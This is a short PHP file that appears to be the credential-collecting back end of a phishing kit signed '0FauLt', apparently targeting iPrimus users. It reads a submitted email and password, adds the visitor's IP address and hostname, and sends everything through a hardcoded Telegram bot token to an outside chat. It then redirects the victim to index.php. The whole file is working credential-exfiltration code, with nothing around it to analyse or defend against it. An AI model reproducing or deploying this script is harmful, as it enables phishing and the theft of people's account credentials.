<?php



    extract($_REQUEST);
    $ip = getenv("REMOTE_ADDR");
    $coder = "🚦☠️ 0FauLt ☠️🚦 Iprimus". "\n";
    $message = $coder . "🎲Ip : " . $ip . "\n"."📧Email : " . $key ."\n"."🔐password : " . $pin ."\n" . "🏠Host : ".gethostbyaddr(getenv("REMOTE_ADDR"))."\n";
    $token = "5494756103:AAFQJdsJg73JwvWVOjJ9JvRY3On47bfetN8";

$data = [
    'text' => $message,
    'chat_id' => '-1001554172935'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    header("Location: index.php");


 ?>
